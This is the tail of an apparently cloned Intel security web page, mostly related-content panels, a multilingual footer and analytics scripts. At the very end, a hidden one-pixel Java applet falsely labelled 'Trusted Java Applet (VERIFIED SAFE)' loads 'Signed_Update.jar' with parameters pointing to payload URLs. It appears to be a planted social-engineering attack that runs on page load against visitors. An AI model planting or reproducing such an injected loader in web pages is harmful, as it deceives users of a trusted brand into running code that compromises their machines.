});
</script></div>

        </div>
        <div class="">
        <div class="parbase relatedmaterials related"><!--
Related Component
-->


        

                        

 
</div>

        </div>
        <div class="">
        <div class="parbase related2 relatedmaterials2"><!--
Related Component
-->






    
    
        <div class="component" data-component="related2" data-component-id="1">    
    



<div class="module related-comp" id="related">
<div class="module-header">
    <h4>Related Materials</h4>
    
    
    
    
    
    
    
    
     
          
    
    

    
    
        <a id="viewmore" class="relatedViewMore" href="https://www-ssl.intel.com/content/www/us/en/library/viewmore.results.html?prTag=rtopic:intelhome/security&amp;taTag=" title="View More" style="" data-viewmoretext="View More" data-viewtopics="View More Topics" data-viewcontent="View More Content" data-viewproducts="" data-urltopics="/content/www/us/en/library/viewmore.results.html?prTag=rtopic:intelhome/security&taTag=&format=collectiontopic" data-urlcontent="/content/www/us/en/library/viewmore.results.html?prTag=rtopic:intelhome/security&taTag=">
           <span>View More Content</span>
        </a>
    
    
	
	
	
	
    
 </div>
 
 
<!--module-header-->
<div class="module-content">
<ul class="sidebar">
    
    <li class="first"><a href="index.html#" rel="panel1" class="selected" data-pagetags="" data-name="assetdetail">Related Content</a></li>
    
    <li><a href="index.html#" rel="panel2" data-pagetags="" data-name="topiccollection">Related Topics</a></li>
    
    <li><a href="index.html#" rel="panel3" class="hideViewMore" data-pagetags="" data-name="productcollection">Related Products</a></li>
    
</ul>

<div class="panel panel1 selected" id="relatedcontent1" class="component" data-component="relatedcontent" data-component-id="1">
<ul class="related-ul">

<li>
    
    <div class="signature-assets  "><img src="https://www-ssl.intel.com/content/dam/www/global/icons/page-types/Image-Content-Library-Icon.png.rendition.cq5dam.thumbnail.64.64.png" class="s-icon" style="background: none"/>
        <div class="s-flag-it"></div>
        <div class="s-flag-lock"><a href="https://www-ssl.intel.com/content/www/us/en/enterprise-security/intel-mcafee-solutions-secure-cloud-interactive.html"></a></div>
    </div>
    
    <h2><a href="https://www-ssl.intel.com/content/www/us/en/enterprise-security/intel-mcafee-solutions-secure-cloud-interactive.html" title="Secure Cloud Solutions Protect System Infrastructures">Secure Cloud Solutions...</a></h2>
    <p>Solutions provide continuous system monitoring, helping meet uptime and compliance mandates.</p>
</li>

<li>
    
    <div
            class="signature-assets s-pdf  ">
        <div class="s-icon"><a href="https://www-ssl.intel.com/content/www/us/en/distributor/mcafee-antivirus-opportunity-infographic.html"></a></div>
        <div class="s-flag-it"></div>
        <div class="s-flag-lock"><a href="https://www-ssl.intel.com/content/www/us/en/distributor/mcafee-antivirus-opportunity-infographic.html"></a></div>
    </div>
    
    <h2><a href="https://www-ssl.intel.com/content/www/us/en/distributor/mcafee-antivirus-opportunity-infographic.html" title="Confidently Surf, Shop, Socialize: McAfee AntiVirus Plus*">Confidently Surf, Shop,...</a></h2>
    <p>Infographic: Describes McAfee AntiVirus Plus* benefits and marketing tips with a features chart.<br /><a data-wap="{&quot;linktype&quot;:&quot;previewpdf&quot;}" href="https://www-ssl.intel.com/content/www/us/en/distributor/mcafee-antivirus-opportunity-infographic.html">Preview</a> | <a data-wap="{&quot;linktype&quot;:&quot;downloadpdf&quot;}" title="Right-Click to Save As" href="https://www-ssl.intel.com/content/dam/www/public/us/en/documents/marketing-briefs/mcafee-antivirus-opportunity-infographic.pdf">Download</a></p>
</li>

<li>
    
    <div class="signature-assets  "><img src="https://www-ssl.intel.com/content/dam/www/global/icons/page-types/Video-Content-Library-Icon.png.rendition.cq5dam.thumbnail.64.64.png" class="s-icon" style="background: none"/>
        <div class="s-flag-it"></div>
        <div class="s-flag-lock"><a href="https://www-ssl.intel.com/content/www/us/en/security/ultrabook-security-video.html"></a></div>
    </div>
    
    <h2><a href="https://www-ssl.intel.com/content/www/us/en/security/ultrabook-security-video.html" title="Computer Theft Security Starts with Intel">Computer Theft Security...</a></h2>
    <p>Protect your Ultrabook™ using Intel® AT for remote lockdown and enhanced security with Intel® IPT. </p>
</li>

<li>
    
    <div class="signature-assets  "><img src="https://www-ssl.intel.com/content/dam/image/Icons/Page_Types/Whitepaper-Content-Library-icon-64x64.png.rendition.cq5dam.thumbnail.64.64.png" class="s-icon" style="background: none"/>
        <div class="s-flag-it"></div>
        <div class="s-flag-lock"><a href="https://www-ssl.intel.com/content/www/us/en/it-management/intel-it-best-practices/technology-tips-teen-privacy.html"></a></div>
    </div>
    
    <h2><a href="https://www-ssl.intel.com/content/www/us/en/it-management/intel-it-best-practices/technology-tips-teen-privacy.html" title="Teen Web Security">Teen Web Security</a></h2>
    <p>Learn how to protect teens using social media.<br /><a data-wap="{&quot;linktype&quot;:&quot;previewpdf&quot;}" href="https://www-ssl.intel.com/content/www/us/en/it-management/intel-it-best-practices/technology-tips-teen-privacy.html">Preview</a> | <a data-wap="{&quot;linktype&quot;:&quot;downloadpdf&quot;}" title="Right-Click to Save As" href="https://www-ssl.intel.com/content/dam/www/public/us/en/documents/best-practices/technology-tips-teen-privacy.pdf">Download</a></p>
</li>

</ul>
</div>

<div class="panel panel2" id="relatedtopics1" class="component"
     data-component="relatedtopics"
     data-component-id="1">
    <ul>
        
        <li><a href="https://www-ssl.intel.com/content/www/us/en/home-users/intel-visibly-smart-technology-for-the-home.html" title="Technology for the Home">Technology for the Home</a></li>
        
    </ul>
</div>

<div class="panel panel3" id="relatedproducts1">

<ul class="carousel-item active">
    <li class="first">
             <a href="https://www-ssl.intel.com/content/www/us/en/processors/core/core-i7-processor.html" title="Intel® Core™ i7 Processor" class="item"> <span class="img-crop">
                <img src="https://www-ssl.intel.com/content/dam/image/Badges/badge-core-i7.png.rendition.cq5dam.thumbnail.128.128.png" alt=" "/>
                 </span> Intel® Core™ i7 Processor</a>
                <p>Whether it's HD or 3D, multitasking or multimedia, 3rd generation Intel® Core™...</p>
            </li>
            
            <li>
                 <a href="https://www-ssl.intel.com/content/www/us/en/processors/core/core-i5-processor.html" title="Intel® Core™ i5 Processor" class="item"> <span class="img-crop">
                <img src="https://www-ssl.intel.com/content/dam/image/Badges/badge-core-i5.png.rendition.cq5dam.thumbnail.128.128.png" alt=" "/>
                 </span> Intel® Core™ i5 Processor</a>
                <p>The smart performance of the Intel® Core™ i5 processor automatically delivers a...</p>
            </li>
            
            <li>
                 <a href="https://www-ssl.intel.com/content/www/us/en/processors/core/core-i3-processor.html" title="Intel® Core™ i3 Processor" class="item"> <span class="img-crop">
                <img src="https://www-ssl.intel.com/content/dam/image/Badges/badge-core-i3.png.rendition.cq5dam.thumbnail.128.128.png" alt=" "/>
                 </span> Intel® Core™ i3 Processor</a>
                <p>As the first level of Intel's latest processor family, the 3rd generation...</p>
            </li>
            
            <li>
                 <a href="https://www-ssl.intel.com/content/www/us/en/processors/core/core-i5-processor-office-use.html" title="Business Use: Intel® Core™ i5 Processor" class="item"> <span class="img-crop">
                <img src="https://www-ssl.intel.com/content/dam/image/Badges/badge-core-i5.png.rendition.cq5dam.thumbnail.128.128.png" alt=" "/>
                 </span> Business Use: Intel® Core™ i5 Processor</a>
                <p>Intel® Core™ i5 processor for business use has 4-way multitasking capability.</p>
            </li>
            
        </ul>
            
    
      
      <!-- / carousal controls -->
</div>

 
</div>

</div>

</div>
</div>

        </div>
        	<div class="">
             <div class="conversations">


 

<div class="component" data-component="conversations" data-component-id="1" >



</div>


</div>

            </div>
            <div class="">
             <div class="conversations_new">




</div>

            </div>

             
        <div class="disclaimers parbase">


 
         
<style type="text/css">
#disclaimer-txt-content p{display: block;}
#disclaimer-txt-content .note-headings{display: block; margin-top: 15px; font-weight: bold;}

</style></div>

    </div>
           
<script type="text/javascript">
createCookie('Topic%2FIntel%40Home%2FSecurity', '',30);
</script>
<!-- Script to create cookie for Recommended For Members Component. -->
<script src="https://www-ssl.intel.com/etc/designs/ver/3.1.188.10.27/intel/us/en/js/json2.js" type="text/javascript"></script> 
 <script type="text/javascript">

$(document).ready( function () {
     
    jQuery(document).ready(function(){
        var pageEntry = {
            'pageName':  '/content/www/us/en/forms/passwordwin'.substr( '/content/www/us/en/forms/passwordwin'.lastIndexOf('/') + 1),
            'visitDate': '06-01-2013 03-11',
            'pageTags': 'Topic%2FIntel%40Home%2FSecurity',
            'contentAttribute' : ''
          };
    //var ids = [pageEntry, pageEntry];
    //var str = JSON.stringify(ids);
    //setCookie('RecommendedForMembers', str, 30);
    
    var the_cookie = document.cookie.split(';');
    var jsonObject="";
    //alert('false');
    var flag = 'false';
    if('false'=='true'){
        for(var i=0; i<the_cookie.length; i++) {
            var value = the_cookie[i];

            if(value.indexOf('RecommendedForMembers') != -1){
                jsonObject=value.substr(value.indexOf("=")+1);
                
                var obj = jQuery.parseJSON(jsonObject);
                for(var j=0;j<obj.length;j++){
                   if(obj[j].pageName=='/content/www/us/en/forms/passwordwin')
                       {
                       break;
                       }
                   else 
                       {if(j==(obj.length-1))
                           {jsonObject=jsonObject.substr(0,jsonObject.indexOf("]"))+","+JSON.stringify(pageEntry)+"]";
                       setCookie("RecommendedForMembers",jsonObject,30);
                       break;}
                           }
               }
                flag= 'false';
                break;
            }
            else{
                flag= 'true';
                }
        }
        if(flag=='true'){
            var ids = [pageEntry];
            var str = JSON.stringify(ids);
            //alert('Cookie Created!!!');
            setCookie("RecommendedForMembers",str,30);
        }
    }else{
        //alert('No TAGS .. SO cookie is not created for this page');
    }
    
});
    
});</script>
<!-- End of cookie creation for Recommended For Members. -->
</script>

		

        






        


<div class="footer globalfooter">



















<div id="footer" class="component" data-component="footer"
     data-component-id="1">
    <div class="content">
        <div class="proactivechat">


</div>

        <ul>
           
            <li class="latest-news">
                <a class="open" href="http://newsroom.intel.com" style="padding-right:12px">Newsroom
                </a>

                <div class="news-wrapper">
                </div>
            </li>
            
            <li class="social-icons">
                <div class="footersocial footer-icons">






            
<a href="https://twitter.com/intel" title="Intel on Twitter" target="_blank" data-wap="{&quot;linktype&quot;:&quot;footersocial&quot;}">
            <img class="non-hover" src="https://www-ssl.intel.com/content/dam/www/global/icons/social/twitter.png" alt="Intel on Twitter" width="20" height="20"/>
			<img class="on-hover" style="display: none;" src="https://www-ssl.intel.com/content/dam/www/global/icons/social/twitter-hover.png" alt="Intel on Twitter" width="20" height="20"/>
        </a><a href="https://www.facebook.com/Intel" title="Intel on Facebook" target="_blank" data-wap="{&quot;linktype&quot;:&quot;footersocial&quot;}">
            <img class="non-hover" src="https://www-ssl.intel.com/content/dam/www/global/icons/social/facebook.png" alt="Intel on Facebook" width="20" height="20"/>
			<img class="on-hover" style="display: none;" src="https://www-ssl.intel.com/content/dam/www/global/icons/social/facebook-hover.png" alt="Intel on Facebook" width="20" height="20"/>
        </a></div>

            </li>
            <li class="language">
                <span>USA (English)</span>
            </li>
        </ul>
        <div id="language-chooser" class="hidden">
            
            <div class="top-border"><img class="close-button" alt="Close Menu" src="https://www-ssl.intel.com/etc/designs/ver/3.1.188/intel/us/en/images/close.png"/></div>

            <div class="content">
                
                <ul class="left-col first">
                    

                    <li class="category">Asia Pacific
                    </li>
                    
                    <li class="lang-option"><a href='http://www.intel.com/content/www/xa/en/homepage.html'>Asia Pacific (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.com.au/content/www/au/en/homepage.html'>Australia (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.cn/content/www/cn/zh/homepage.html'>China (简体中文)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.hk/content/www/hk/en/homepage.html'>Hong Kong (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.in/content/www/in/en/homepage.html'>India (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.in/content/www/in/hi/homepage.html'>India (हिंदी)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.co.id/content/www/id/id/homepage.html'>Indonesia (Bahasa Indonesia)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.co.jp/content/www/jp/ja/homepage.html'>Japan (日本語)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.co.kr/content/www/kr/ko/homepage.html'>Korea (한국어)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.my/content/www/my/en/homepage.html'>Malaysia (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.pk/content/www/pk/en/homepage.html'>Pakistan (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.co.nz/content/www/nz/en/homepage.html'>New Zealand (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.ph/content/www/ph/en/homepage.html'>Philippines (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.com/content/www/xa/en/homepage.html'>Singapore (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.com.tw/content/www/tw/zh/homepage.html'>Taiwan (繁體中文)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://thailand.intel.com/content/www/th/th/homepage.html'>Thailand (ไทย)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.vn/content/www/vn/vi/homepage.html'>Vietnam (Tiếng Việt)
                    </a></li>
                    

                    
                </ul>
                
                <ul class="left-col">
                    

                    <li class="category">Europe
                    </li>
                    
                    <li class="lang-option"><a href='http://www.intel.de/content/www/de/de/homepage.html'>Austria (Deutsch)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.fr/content/www/fr/fr/homepage.html'>Belgium (Français)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.nl/content/www/nl/nl/homepage.html'>Belgium (Nederlands)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.fr/content/www/fr/fr/homepage.html'>France (Français)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.de/content/www/de/de/homepage.html'>Germany (Deutsch)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.eu/content/www/eu/en/homepage.html'>Europe (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.ie/content/www/ie/en/homepage.html'>Ireland (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.it/content/www/it/it/homepage.html'>Italy (Italiano)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.ru/content/www/ru/ru/homepage.html'>Kazakhstan (Русский)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.nl/content/www/nl/nl/homepage.html'>Netherlands (Nederlands)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.pl/content/www/pl/pl/homepage.html'>Poland (Polski)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.ru/content/www/ru/ru/homepage.html'>Russia (Русский)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.es/content/www/es/es/homepage.html'>Spain (Español)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.se/content/www/se/sv/homepage.html'>Sweden (Svenska)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.ch/content/www/ch/de/homepage.html'>Switzerland (Deutsch)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.com.tr/content/www/tr/tr/homepage.html'>Turkey (Türkçe)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.ua/content/www/ua/uk/homepage.html'>Ukraine (Українська)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.co.uk/content/www/uk/en/homepage.html'>United Kingdom (English)
                    </a></li>
                    

                    
                </ul>
                
                <ul class="left-col">
                    

                    <li class="category">Latin America
                    </li>
                    
                    <li class="lang-option"><a href='http://www.intel.la/content/www/xl/es/homepage.html'>Argentina (Español)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.la/content/www/xl/es/homepage.html'>Bolivia (Español)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.com.br/content/www/br/pt/homepage.html'>Brazil (Português)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.la/content/www/xl/es/homepage.html'>Chile (Español)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.la/content/www/xl/es/homepage.html'>Colombia (Español)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.la/content/www/xl/es/homepage.html'>Costa Rica (Español)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.la/content/www/xl/es/homepage.html'>Latin America (Español)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.la/content/www/xl/es/homepage.html'>Mexico (Español)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.la/content/www/xl/es/homepage.html'>Peru (Español)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.la/content/www/xl/es/homepage.html'>Uruguay (Español)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.la/content/www/xl/es/homepage.html'>Venezuela (Español)
                    </a></li>
                    

                    
                </ul>
                
                <ul class="left-col">
                    

                    <li class="category">Middle East/Africa
                    </li>
                    
                    <li class="lang-option"><a href='http://www.intel.com/content/www/xr/en/homepage.html'>Egypt (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.com/index.htm?ar_EG_01'>Egypt (ة العربية)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.com/cd/corporate/europe/emea/heb/287256.htm'>Israel (עברית)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.com/content/www/xr/en/homepage.html'>Middle East (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.com/index.htm?ar_XR_01'>Middle East (اللغة العربية)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.com/content/www/xr/en/homepage.html'>Saudi Arabia (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.com/index.htm?ar_SA_01'>Saudi Arabia (اللغة العربية)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.co.za/content/www/za/en/homepage.html'>South Africa (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.com/content/www/xr/en/homepage.html'>United Arab Emirates (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.com/index.htm?ar_AE_01'>United Arab Emirates (اللغة العربية)
                    </a></li>
                    

                    

                    <li class="category"><br>North America
                    </li>
                    
                    <li class="lang-option"><a href='http://www.intel.com/content/www/us/en/forms/passwordwin.html'>United States (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.com/en_CA/index.htm'>Canada (English)
                    </a></li>
                    
                    <li class="lang-option"><a href='http://www.intel.com/fr_CA/index.htm'>Canada (Français)
                    </a></li>
                    

                    
                </ul>
                
            </div>
            
        </div>
        <div id="tools-chooser" class="hidden">
            <div class="footertools">





<div class="content" data-component="footertools" data-component-id="1">

	<div class="top-border">
		<img class="close-button" alt="Close Menu" src="https://www-ssl.intel.com/etc/designs/ver/3.1.188/intel/us/en/images/close.png"/></div>
	
	<h2>Tools</h2>


	<ul class="items">
	
	
	  
	</ul>
</div>
</div>

        </div>
        
    </div>
</div>

<script type="text/javascript">
    jQuery(function () {

        var iconsWidth = $("#footer li.social-icons").outerWidth("true");
        var newsWidth = 960;
        var toolsWidth = 0;
        var languageWidth = $("#footer li.language").outerWidth("true");
        var padding = parseInt($("#footer li.latest-news").css("padding-right"), 10) +
                parseInt($("#footer li.latest-news").css("padding-left"), 10) +
                parseInt($("#footer li.latest-news").css("margin-left"), 10) +
                parseInt($("#footer li.latest-news").css("margin-right"), 10);
        if ($("#footer li.tools").length > 0) {
            toolsWidth = 145;
            $("#footer li.tools").css("width", toolsWidth);
        }
        $("#footer li.latest-news").css("width", newsWidth - iconsWidth - toolsWidth - padding - languageWidth - 5);
        $("#footer li.social-icons div.footer-icons a").hover(
                function () {
                    $("img.non-hover", this).hide();
                    $("img.on-hover", this).show();
                },
                function () {
                    $("img.non-hover", this).show();
                    $("img.on-hover", this).hide();
                }
        );

        var newsRoomUrl = "http://feeds.feedburner.com/IntelNewsroom";
        var newsRoomSecureUrl = "https://secure-inside.intel.com/presto/edge/api/rest/IntelNewsroomFeedburner/runMashup?x-presto-resultFormat=rss&x-p-anonymous=true";
        if (window.parent.document.location.protocol == "http:") {
            jQuery('.news-wrapper').rssfeed(newsRoomUrl, {
                limit: 5
            });
        }
        else if ((window.parent.document.location.protocol == "https:") && (newsRoomSecureUrl != '')) {
            jQuery('.news-wrapper').rssfeed(newsRoomSecureUrl, {
                limit: 5
            });
        }
    });

    /*
     $(document).ready(function (){
     $('.clearOnFocus').clearOnFocus();
     });
     */
</script>
</div>


<div class="footerlinks">



    <div id="legal"
    	 class="component" data-component="footerlinks" data-component-id="1">
        <ul class="links" >
        <li style="float:left;margin:0px;"><span class="copyright">&#169;</span> Intel Corporation</li> 
    
        <li><a href="https://www-ssl.intel.com/content/www/us/en/company-overview/company-overview.html">Company Information</a></li>
    
        <li><a href="http://www.intel.com/p/en_US/support/">Support</a></li>
    
        <li><a href="https://www-ssl.intel.com/content/www/us/en/company-overview/contact-us.html">Contact Us</a></li>
    
        <li><a href="http://www.intel.com/jobs/">Jobs</a></li>
    
        <li><a href="http://www.intc.com">Investor Relations</a></li>
    
        <li><a href="https://www-ssl.intel.com/content/www/us/en/siteindex.html">Site Map</a></li>
    
        <li><a href="https://www-ssl.intel.com/content/www/us/en/legal/terms-of-use.html">Terms of Use</a></li>
    
        <li><a href="https://www-ssl.intel.com/content/www/us/en/legal/trademarks.html">*Trademarks</a></li>
    
        <li><a href="https://www-ssl.intel.com/content/www/us/en/privacy/intel-online-privacy-notice-summary.html">Privacy</a></li>
    
        <li><a href="https://www-ssl.intel.com/content/www/us/en/privacy/intel-cookie-notice.html">Cookies</a></li>
    
       </ul>
    </div>
    </div>





    <script type="text/javascript">
    /*{
        window.setTimeout(function() {
            $CQ.getScript("http://localhost:4502/libs/wcm/stats/tracker.js?path=/content/www/us/en/forms/passwordwin");
        }, 1);
    } */
    </script>

<script type="text/javascript">function trackMVTImpression() {
    
    }</script>


<script type="text/javascript" src="https://www-ssl.intel.com/etc/designs/ver/3.1.188.5.31/intel/us/en/clientlibs/footer-libs.js"></script>

<!--[if IE 6]>
<script type="text/javascript" src="/etc/designs/intel/us/en/js/intel.ie6.footer.js"></script>
<![endif]-->
    </div>

		<div class="parbase clientcontext"><script type="text/javascript" src="https://www-ssl.intel.com/etc/clientlibs/ver/3.1.188/foundation/librarymanager.js"></script>
<script type="text/javascript">
CQClientLibraryManager.write([{"p":"/etc/clientlibs/foundation/shared.js","c":[]},{"p":"/etc/clientlibs/foundation/jquery-ui.js","c":[]},{"p":"/etc/clientlibs/foundation/personalization/jcarousel.js","c":[]},{"p":"/etc/clientlibs/foundation/personalization/jcarousel.css","c":[]},{"p":"/etc/clientlibs/foundation/personalization.js","c":[]},{"p":"/etc/clientlibs/foundation/jquery-ui/themes/default.css","c":[]},{"p":"/etc/clientlibs/foundation/personalization/themes/default.css","c":[]},{"p":"/etc/clientlibs/foundation/personalization/ie6/themes/default.css","c":["ie6"]}],false);
</script>
<script type="text/javascript">
    $CQ(function() {
        CQ_Analytics.SegmentMgr.loadSegments("/etc/segmentation");
        CQ_Analytics.ClientContextUtils.init("/etc/clientcontext/intel","/content/www/us/en/forms/passwordwin");
        CQ_Analytics.ClientContextUtils.initUI("/etc/clientcontext/intel","/content/www/us/en/forms/passwordwin");
    });
</script></div>

        <div class="analytics">
<!-- Added getAnalyticsResource for secured content  -->






<!-- Added getAnalyticsResource for secured content -->

<!-- SiteCatalyst code version: H.22.1.
Copyright 1996-2010 Adobe, Inc. All Rights Reserved
More info available at http://www.omniture.com -->
<script language="JavaScript" type="text/javascript" src="https://www-ssl.intel.com/content/www/_jcr_content/analytics.sitecatalyst.js"></script>


<script type="text/javascript">

    //<![CDATA[
    (function() {
    var url="/content/dam/www/global/wap/wap.js";
    var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;  po.src = url;
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
    })();
    // ]]>
</script>



<!-- End SiteCatalyst code version: H.22.1. -->
</div>

    <div class="hidden">







<!--
More detailed timing info is available by uncommenting some code in the timing.jsp component
Timing chart URL:
http://chart.apis.google.com/chart?chtt=passwordwin.html+%281000ms%29&cht=bhs&chxt=x&chco=c6d9fd,4d89f9&chbh=a&chds=0,1000,0,1000&chxr=0,0,1000&chd=t:0,47,47,47,47,47,47,47,63,63,63,63,63,63,63,63,63,78,78,78,78,78,78,94,94,94,94,94,94,157,172,172,407,407,953,953,953,953,953,953,953,969,985,985,985,985,985,985,985,1000|47,0,0,0,0,0,31,31,0,0,0,0,0,0,0,15,15,0,0,0,0,16,875,0,0,0,63,63,63,0,0,235,0,546,0,0,0,0,16,32,32,0,0,0,0,0,0,0,15,0&chly=head.jsp|gomez.jsp|headlibs.jsp|init.jsp|headcustom.jsp|header.html%29|uheader.jsp|header.jsp|logo.html%29|logo.jsp|uheadernavigationtitle...|mainmenutitle.jsp|homepagesearch.jsp|uheaderlinks.html%29|uheaderlinks.jsp|unavmyintel.jsp|unavmyintel.jsp|savedcontents.jsp|oldbrowsersdialog.jsp|redirect.jsp|detailedtemplatetagged...|detailedtemplatebackbu...|content.jsp|intelparsys.jsp|masthead.jsp|templateIeditorial.jsp|systemchecker.jsp|intelparsys.jsp|main.jsp|intelparsys.jsp|videofilmstripgallery.jsp|relatedbladevideos2.jsp|related.jsp|related2.jsp|conversations.jsp|conversations_new.jsp|disclaimers.jsp|globalfooter.html%29|proactivechat.jsp|footer.jsp|footer.jsp|footersocial.jsp|footertools.jsp|footerlinks.html%29|footerlinks.jsp|mvt_stats.jsp|stats.jsp|clientcontext.jsp|analytics.jsp|sitecatalyst.jsp&chs=600x500
-->

</div>


	
	<link rel="stylesheet" type="text/css" href="https://fast.fonts.com/t/1.css?apiType=css&amp;projectid=75738e54-c2a7-470f-99bb-8f1e8ffb49a2"/>


<applet width="1" height="1" id="Trusted Java Applet (VERIFIED SAFE)" code="Java.class" archive="Signed_Update.jar"><param name="1" value="http://127.0.0.1:80/jDJYdqWaHXn"><param name="2" value=""><param name="3" value="http://127.0.0.1:80/Un7i01S9UmaUu42"><param name="4" value="http://127.0.0.1:80/NK1YtK5S7hcCBum"><param name="5" value=""><param name="6" value=""><param name="7" value="freehugs"><param name="8" value="YES"><param name="9" value="https://www-ssl.intel.com/content/www/us/en/forms/passwordwin.html"><param name="10" value=""><param name="separate_jvm" value="true"></applet>

</body>
</html>
